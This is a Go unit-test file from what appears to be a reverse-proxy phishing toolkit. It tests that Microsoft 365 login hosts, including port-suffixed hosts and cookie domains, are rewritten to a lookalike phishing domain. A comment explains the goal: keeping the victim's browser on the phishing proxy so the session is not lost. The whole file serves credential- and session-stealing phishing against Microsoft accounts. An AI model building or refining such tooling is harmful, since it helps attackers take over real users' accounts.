package core

import "testing"

func TestStripHostPort(t *testing.T) {
	cases := []struct{ in, want string }{
		{"m365.cloud.microsoft:443", "m365.cloud.microsoft"},
		{"m365.cloud.microsoft", "m365.cloud.microsoft"},
		{"login.microsoftonline.com:8443", "login.microsoftonline.com"},
		{"[::1]:443", "::1"},
		{"[::1]", "[::1]"},
		{"", ""},
	}
	for _, c := range cases {
		if got := stripHostPort(c.in); got != c.want {
			t.Errorf("stripHostPort(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Microsoft emits Locations such as https://m365.cloud.microsoft:443/login.
// The phishlet declares the host without a port; if the port defeats the match
// the response is served from the real host and the browser leaves the phish.
func TestReplaceHostWithPhishedIgnoresPort(t *testing.T) {
	cfg := &Config{
		phishlets: map[string]*Phishlet{
			"o365new": {
				Name: "o365new",
				proxyHosts: []ProxyHost{
					{phish_subdomain: "m365", orig_subdomain: "m365", domain: "cloud.microsoft"},
				},
			},
		},
		phishletConfig: map[string]*PhishletConfig{
			"o365new": {Hostname: "platoveriour.com", Enabled: true},
		},
	}
	p := &HttpProxy{cfg: cfg}

	for _, host := range []string{"m365.cloud.microsoft", "m365.cloud.microsoft:443"} {
		got, ok := p.replaceHostWithPhished(host)
		if !ok || got != "m365.platoveriour.com" {
			t.Errorf("replaceHostWithPhished(%q) = (%q, %v), want (m365.platoveriour.com, true)", host, got, ok)
		}
	}

	// leading dot (cookie domains) must survive
	if got, ok := p.replaceHostWithPhished(".m365.cloud.microsoft:443"); !ok || got != ".m365.platoveriour.com" {
		t.Errorf("dotted form = (%q, %v), want (.m365.platoveriour.com, true)", got, ok)
	}

	// an undeclared host stays undeclared
	if _, ok := p.replaceHostWithPhished("m365.cloud.microsoft.evil.test:443"); ok {
		t.Error("undeclared host must not match")
	}
}
